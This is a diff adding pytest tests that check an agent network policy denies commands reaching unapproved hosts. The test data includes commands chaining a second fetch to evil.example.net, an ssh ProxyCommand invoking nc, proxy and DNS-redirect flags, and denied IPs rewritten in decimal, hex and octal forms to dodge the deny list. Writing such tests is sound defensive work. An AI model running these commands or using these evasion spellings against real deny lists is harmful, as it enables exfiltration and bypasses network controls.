@@ -279,3 +279,36 @@ def test_an_agent_naming_a_runner_that_does_not_exist_is_invalid():
     body['agents']['builder']['runner'] = 'ghost'
     body['agents']['builder']['localSkills'] = {}
     assert any(issue.path == 'agents.builder.runner' for issue in _semantic_issues(body))
+
+
+@pytest.mark.parametrize('argv', [
+    ['curl', 'https://api.example.com/a https://evil.example.net/b'],
+    ['sh', '-c', 'curl https://api.example.com/ok; curl https://evil.example.net/x'],
+    ['bash', '-c', 'echo hi && wget evil.example.net/x'],
+    ['curl', '--proxy', 'http://api.example.com:3128', 'https://api.example.com/'],
+    ['curl', '-x', 'api.example.com:3128', 'https://api.example.com/'],
+    ['curl', '--resolve', 'api.example.com:443:203.0.113.7', 'https://api.example.com/'],
+    ['curl', '--connect-to', 'api.example.com:443:evil.example.net:443', 'https://api.example.com/'],
+    ['ssh', '-o', 'ProxyCommand=nc evil.example.net 22', 'git@api.example.com'],
+    ['ssh', '-J', 'jump.example.net', 'git@api.example.com'],
+])
+def test_every_host_and_every_redirect_is_judged(argv):
+    assert network.command_denied(defn(), 'builder', argv) is not None, argv
+
+
+@pytest.mark.parametrize('url', ['http://3405803783/', 'http://0xcb.0.113.7/', 'http://0313.0.0161.7/', 'http://[::ffff:203.0.113.7]/'])
+def test_a_denied_address_in_another_spelling_is_still_denied(url):
+    body = defn(networkPolicy={'deniedHosts': ['203.0.113.7']})
+    assert network.command_denied(body, 'builder', ['curl', url]) is not None, url
+
+
+def test_a_denied_name_written_in_unicode_is_still_denied():
+    body = defn(networkPolicy={'deniedHosts': ['xn--bcher-kva.example']})
+    assert network.command_denied(body, 'builder', ['curl', 'https://bücher.example/']) is not None
+
+
+def test_a_local_test_command_is_still_local():
+    assert network.command_denied(defn(), 'builder', ['sh', '-c', 'python -m pytest tests && echo done']) is None
+    assert network.command_denied(defn(), 'builder', ['sed', '-e', 's/a/b/', 'notes.md']) is None
+    assert network.command_denied(defn(), 'builder', ['make', '-j', '4']) is None
+    assert network.command_denied(defn(), 'builder', ['git', '-c', 'http.proxy=http://api.example.com:1', 'fetch']) is not None
